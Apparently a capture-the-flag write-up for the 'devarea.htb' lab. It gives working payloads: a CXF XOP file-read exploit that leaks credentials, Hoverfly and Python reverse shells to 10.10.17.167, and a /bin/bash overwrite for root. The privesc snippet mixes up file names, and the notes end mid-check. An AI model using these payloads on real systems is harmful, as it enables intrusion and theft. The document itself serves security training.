### Nmap
```
nmap -sV -sC -vv 10.129.20.44

---OUTPUT---
Nmap scan report for 10.129.20.44
Host is up, received echo-reply ttl 63 (0.017s latency).
Scanned at 2026-03-30 03:55:12 EDT for 31s
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD5s4VbmJmJE5NzFN8hY3uJZo3GHyZbsZy5xQiGBTnfjhK1Ya4cJAcX8R+ZR01Q7zQN+S3HD/2cY8VXIwPDl1Yk=
|   256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBNRMFlkdjnZ3/y18k16stZAv/NHxEz5Ut68zr4/KQt
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://devarea.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.27.v20200227)
8500/tcp open  http    syn-ack ttl 63 Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 30 Mar 2026 07:55:34 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 30 Mar 2026 07:55:18 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 30 Mar 2026 07:55:19 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8888/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Hoverfly Dashboard
|_http-favicon: Unknown favicon MD5: BAA090FBC1418C8C4971002CC5459574
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.98%I=7%D=3/30%Time=69CA2C66%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20
SF:Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nDate:\x20Mon,\x2030\x20Mar\x202026\x2007:55:18
SF:\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20ser
SF:ver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(
SF:HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nDate:\x20Mon,\x2030\x20Mar\x202026\x2007:55:19\x20GMT\r\nCo
SF:ntent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does
SF:\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPRequest,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20In
SF:ternal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Mon,\x2030\x20Mar
SF:\x202026\x2007:55:34\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\
SF:x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\
SF:x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- 4 http ports open : 80, 8080, 8500 and 8888

### 80
![[Pasted image 20260330040031.png]]



### 8080
![[Pasted image 20260330040052.png]]

### 8500
- Proxy server

![[Pasted image 20260330040121.png]]

#### 8888
- HoverFly login:
![[Pasted image 20260330040145.png]]

----
- on port 8080 Jetty is running and if we find (not sur ehow) the sub path `/employeeservice` we can see CXF is running on with with SOAP:
![[Pasted image 20260330052715.png]]

- Using the `?wsdl` header we get some more info:
```
<wsdl:definitions name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
<wsdl:types>
<xs:schema elementFormDefault="unqualified" targetNamespace="http://devarea.htb/" version="1.0">
<xs:element name="submitReport" type="tns:submitReport"/>
<xs:element name="submitReportResponse" type="tns:submitReportResponse"/>
<xs:complexType name="submitReport">
<xs:sequence>
<xs:element minOccurs="0" name="arg0" type="tns:report"/>
</xs:sequence>
</xs:complexType>
<xs:complexType name="report">
<xs:sequence>
<xs:element name="confidential" type="xs:boolean"/>
<xs:element minOccurs="0" name="content" type="xs:string"/>
<xs:element minOccurs="0" name="department" type="xs:string"/>
<xs:element minOccurs="0" name="employeeName" type="xs:string"/>
</xs:sequence>
</xs:complexType>
<xs:complexType name="submitReportResponse">
<xs:sequence>
<xs:element minOccurs="0" name="return" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:schema>
</wsdl:types>
<wsdl:message name="submitReport">
<wsdl:part element="tns:submitReport" name="parameters"> </wsdl:part>
</wsdl:message>
<wsdl:message name="submitReportResponse">
<wsdl:part element="tns:submitReportResponse" name="parameters"> </wsdl:part>
</wsdl:message>
<wsdl:portType name="EmployeeService">
<wsdl:operation name="submitReport">
<wsdl:input message="tns:submitReport" name="submitReport"> </wsdl:input>
<wsdl:output message="tns:submitReportResponse" name="submitReportResponse"> </wsdl:output>
</wsdl:operation>
</wsdl:portType>
<wsdl:binding name="EmployeeServiceServiceSoapBinding" type="tns:EmployeeService">
<soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
<wsdl:operation name="submitReport">
<soap:operation soapAction="" style="document"/>
<wsdl:input name="submitReport">
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output name="submitReportResponse">
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
</wsdl:binding>
<wsdl:service name="EmployeeServiceService">
<wsdl:port binding="tns:EmployeeServiceServiceSoapBinding" name="EmployeeServicePort">
<soap:address location="http://devarea.htb:8080/employeeservice"/>
</wsdl:port>
</wsdl:service>
</wsdl:definitions>
```
![[Pasted image 20260330053212.png]]

- `type xs:string` catches my eye and looking online i find a CVE : CVE-2022-46364
- Based on this i created a payload file and sent it as a curl command to grab `/etc/passwd`
- payload : 
```
--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <rootpart@example.com>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns2:submitReport xmlns:ns2="http://devarea.htb/">
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/>
        </content>
        <department>test</department>
        <employeeName>test</employeeName>
      </arg0>
    </ns2:submitReport>
  </soap:Body>
</soap:Envelope>
--MIMEBoundary--
```

- I then passed a curl command with this payload:
```
curl -v http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<rootpart@example.com>"; start-info="text/xml"' \
  -H 'SOAPAction: ""' \
  --data-binary @payload.txt
* Host devarea.htb:8080 was resolved.
* IPv6: (none)
* IPv4: 10.129.20.44
*   Trying 10.129.20.44:8080...
* Established connection to devarea.htb (10.129.20.44 port 8080) from 10.10.17.167 port 35164 
* using HTTP/1.x
> POST /employeeservice HTTP/1.1
> Host: devarea.htb:8080
> User-Agent: curl/8.18.0
> Accept: */*
> Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<rootpart@example.com>"; start-info="text/xml"
> SOAPAction: ""
> Content-Length: 650
> 
* upload completely sent off: 650 bytes
< HTTP/1.1 200 OK
< Date: Mon, 30 Mar 2026 10:01:10 GMT
< Content-Type: text/xml;charset=utf-8
< Content-Length: 2921
< Server: Jetty(9.4.27.v20200227)
< 
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from test. Department: test. Content: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDo5OTg6OTk4OnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50Oi86L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4Ojk5Nzo5OTc6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbjovOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDE6MTAyOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6OTkyOjk5MjpzeXN0ZW1kIFJlc29sdmVyOi86L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTAyOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKcG9sa2l0ZDp4Ojk5MTo5OTE6VXNlciBmb3IgcG9sa2l0ZDovOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwMzoxMDQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp1dWlkZDp4OjEwNDoxMDU6Oi9ydW4vdXVpZGQ6L3Vzci9zYmluL25vbG9naW4KdGNwZHVtcDp4OjEwNToxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp0c3M6eDoxMDY6MTA4OlRQTSBzb2Z0d2FyZSBzdGF* Connection #0 to host devarea.htb:8080 left intact
jaywsLDovdmFyL2xpYi90cG06L2Jpbi9mYWxzZQpsYW5kc2NhcGU6eDoxMDc6MTA5OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KZnd1cGQtcmVmcmVzaDp4Ojk4OTo5ODk6RmlybXdhcmUgdXBkYXRlIGRhZW1vbjovdmFyL2xpYi9md3VwZDovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMDg6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwOTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmRldl9yeWFuOng6MTAwMToxMDAxOjovaG9tZS9kZXZfcnlhbjovYmluL2Jhc2gKZnRwOng6MTEwOjExMTpmdHAgZGFlbW9uLCwsOi9zcnYvZnRwOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3dhdGNoOng6OTg0Ojk4NDo6L29wdC9zeXN3YXRjaDovdXNyL3NiaW4vbm9sb2dpbgpwb3N0Zml4Ong6MTExOjExMjo6L3Zhci9zcG9vbC9wb3N0Zml4Oi91c3Ivc2Jpbi9ub2xvZ2luCl9sYXVyZWw6eDo5OTk6OTg3OjovdmFyL2xvZy9sYXVyZWw6L2Jpbi9mYWxzZQpkaGNwY2Q6eDoxMDA6NjU1MzQ6REhDUCBDbGllbnQgRGFlbW9uLCwsOi91c3IvbGliL2RoY3BjZDovYmluL2ZhbHNlCg==</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
```

- I take the b64 encoded text and decrypt it to get some users including `dev_ryan`:
```
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDo5OTg6OTk4OnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50Oi86L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4Ojk5Nzo5OTc6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbjovOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDE6MTAyOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6OTkyOjk5MjpzeXN0ZW1kIFJlc29sdmVyOi86L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTAyOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKcG9sa2l0ZDp4Ojk5MTo5OTE6VXNlciBmb3IgcG9sa2l0ZDovOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwMzoxMDQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp1dWlkZDp4OjEwNDoxMDU6Oi9ydW4vdXVpZGQ6L3Vzci9zYmluL25vbG9naW4KdGNwZHVtcDp4OjEwNToxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp0c3M6eDoxMDY6MTA4OlRQTSBzb2Z0d2FyZSBzdGFjaywsLDovdmFyL2xpYi90cG06L2Jpbi9mYWxzZQpsYW5kc2NhcGU6eDoxMDc6MTA5OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KZnd1cGQtcmVmcmVzaDp4Ojk4OTo5ODk6RmlybXdhcmUgdXBkYXRlIGRhZW1vbjovdmFyL2xpYi9md3VwZDovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMDg6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwOTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmRldl9yeWFuOng6MTAwMToxMDAxOjovaG9tZS9kZXZfcnlhbjovYmluL2Jhc2gKZnRwOng6MTEwOjExMTpmdHAgZGFlbW9uLCwsOi9zcnYvZnRwOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3dhdGNoOng6OTg0Ojk4NDo6L29wdC9zeXN3YXRjaDovdXNyL3NiaW4vbm9sb2dpbgpwb3N0Zml4Ong6MTExOjExMjo6L3Zhci9zcG9vbC9wb3N0Zml4Oi91c3Ivc2Jpbi9ub2xvZ2luCl9sYXVyZWw6eDo5OTk6OTg3OjovdmFyL2xvZy9sYXVyZWw6L2Jpbi9mYWxzZQpkaGNwY2Q6eDoxMDA6NjU1MzQ6REhDUCBDbGllbnQgRGFlbW9uLCwsOi91c3IvbGliL2RoY3BjZDovYmluL2ZhbHNlCg==" | base64 -d | grep "/bin/bash"

---OUTPUT---
root:x:0:0:root:/root:/bin/bash
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
```

- Looking at port 8500 we see HoverFly which is a service: https://github.com/sudhakarsatyam/hoverfly
- As it would be installed on the system we can try to read the file by changing the payload file path to `/etc/systemd/system/hoverfly.service`
- payload 2 :
```
--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <rootpart@example.com>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns2:submitReport xmlns:ns2="http://devarea.htb/">
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/>
        </content>
        <department>test</department>
        <employeeName>test</employeeName>
      </arg0>
    </ns2:submitReport>
  </soap:Body>
</soap:Envelope>
--MIMEBoundary--
```
- I then pass the curl command:
```
curl -v http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<rootpart@example.com>"; start-info="text/xml"' \
  -H 'SOAPAction: ""' \
  --data-binary @payload2.txt
  
  
---OUTPUT---  
* Host devarea.htb:8080 was resolved.
* IPv6: (none)
* IPv4: 10.129.20.44
*   Trying 10.129.20.44:8080...
* Established connection to devarea.htb (10.129.20.44 port 8080) from 10.10.17.167 port 50490 
* using HTTP/1.x
> POST /employeeservice HTTP/1.1
> Host: devarea.htb:8080
> User-Agent: curl/8.18.0
> Accept: */*
> Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<rootpart@example.com>"; start-info="text/xml"
> SOAPAction: ""
> Content-Length: 675
> 
* upload completely sent off: 675 bytes
< HTTP/1.1 200 OK
< Date: Mon, 30 Mar 2026 10:06:03 GMT
< Content-Type: text/xml;charset=utf-8
< Content-Length: 809
< Server: Jetty(9.4.27.v20200227)
< 
* Connection #0 to host devarea.htb:8080 left intact
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from test. Department: test. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
```

- I then decode the base64 text to get some credentials:
```
echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==" | base64 -d


---OUTPUT---
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```
- Credentials : `admin`:`O7IJ27MyyXiU`
- I manage to login to hoverfly dashboard: 
![[Pasted image 20260330060905.png]]

- Furthermmore when looking online I found a possible vulnerability for RCE: 
https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf


- Using the following burp packet (or curl command) I can get a reverse shell:
- Burp packet :
```
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU5MDUzMjQsImlhdCI6MTc3NDg2NTMyNCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.YZ0bFqkNp0oFPAUvIVmpagHKIWxDVGY2EbfsVxUQ8PTI_PNNdxoFvMdIV7yHZNhzzNthVlwULFFUnVmY4ixpRw
Connection: keep-alive
Referer: http://devarea.htb:8888/dashboard
Content-Type: application/json
Content-Length: 94

{
    "binary": "/bin/bash",
    "script": "bash -i >& /dev/tcp/10.10.17.167/4444 0>&1"
}

```
- Curl command (need to get token from burp):
```
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer <TOKEN>" \
  -H 'Content-Type: application/json' \
  -d '{"binary":"bash","script":"bash -i >& /dev/tcp/10.10.17.167/9999 0>&1"}'
```

- I grab a shell as `dev_ryan`:
![[Pasted image 20260330071321.png]]

- I get User flag:
![[Pasted image 20260330071405.png]]

### Root
- Checking sudo permissions we can pass a command as root. This command calls /bin/bash as shown:
```
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
        web-stop, !/opt/syswatch/syswatch.sh web-restart
```
![[Pasted image 20260330082941.png]]

- Can also see bash is world writeable so we could put our payload here and when the service calls bash it will execute our payload.
	- The problem here is that since we are trying to get a shell using bash makes things complicated. SO to bypass this we get a `/bin/sh` python shell.
```
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.17.167",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

- I grab a sell on my listener.
- I then delete all bash sessions running as I will need to edit the bash binary:
```
ps -ax | grep "/bash"
kill -9 <all Pid with bash running>
```
- Once all are dead I can create my malicious payload to make python with an SUID bit:
```
echo '#!/tmp/bash.bak' > /tmp/bash_payload
echo 'chmod u+s /usr/bin/python3' >> /tmp/badbash
chmod +x /tmp/badbash
```
-  I can then move this file into the /bin/bash file ( i also create a backu bash which this code will use)
```
cp /bin/bash /tmp/bash.bak
cp /tmp/bash_payload /bin/bash
```

- I can then run the sudo command which refreshes the service thus executing the bash file:
```
sudo /opt/syswatch/syswatch.sh
```

- I can check if the suid BIT IS ADDED TO PYTHON3:
```
ls -al /usr/bin/python3

---OUTPUT---
